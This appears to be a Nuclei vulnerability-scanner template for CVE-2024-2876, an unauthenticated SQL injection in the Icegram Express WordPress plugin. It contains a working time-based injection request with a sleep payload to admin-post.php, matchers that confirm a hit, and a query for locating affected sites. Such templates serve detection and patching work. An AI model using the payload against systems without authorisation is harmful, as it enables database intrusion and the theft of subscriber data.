http:
- matchers:
  - condition: and
    dsl:
    - duration>=4
    - status_code == 200
    - contains(header, "application/json")
    - contains_all(body, "bulk_action", "_sent", "errortype")
    type: dsl
  raw:
  - '@timeout: 20s

    POST /wp-admin/admin-post.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    page=es_subscribers&is_ajax=1&action=_sent&advanced_filter[conditions][0][0][field]=status=99924)))union(select(sleep(4)))--+&advanced_filter[conditions][0][0][operator]==&advanced_filter[conditions][0][0][value]=1111

    '
id: CVE-2024-2876
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    epss-percentile: 0.9962
    epss-score: 0.91135
  description: 'The Email Subscribers by Icegram Express - Email Marketing, Newsletters,
    Automation for WordPress & WooCommerce plugin for WordPress is vulnerable to SQL
    Injection via the ''run'' function of the ''IG_ES_Subscribers_Query'' class in
    all versions up to, and including, 5.7.14 due to insufficient escaping on the
    user supplied parameter and lack of sufficient preparation on the existing SQL
    query. This makes it possible for unauthenticated attackers to append additional
    SQL queries into already existing queries that can be used to extract sensitive
    information from the database.

    '
  impact: 'Unauthenticated attackers can execute arbitrary SQL queries, potentially
    extracting sensitive subscriber data or modifying database contents.

    '
  metadata:
    max-request: 1
    publicwww-query: /wp-content/plugins/email-subscribers/
    verified: true
  name: Wordpress Email Subscribers by Icegram Express - SQL Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-2876
  - https://www.wordfence.com/blog/2024/04/1250-bounty-awarded-for-unauthenticated-sql-injection-vulnerability-patched-in-email-subscribers-by-icegram-express-wordpress-plugin/
  remediation: 'Update Email Subscribers plugin to a version that patches CVE-2024-2876.

    '
  severity: critical
  tags: time-based-sqli,cve,cve2024,wp,wordpress,wp-plugin,sqli,email-subscribers,wpscan,vkev,vuln
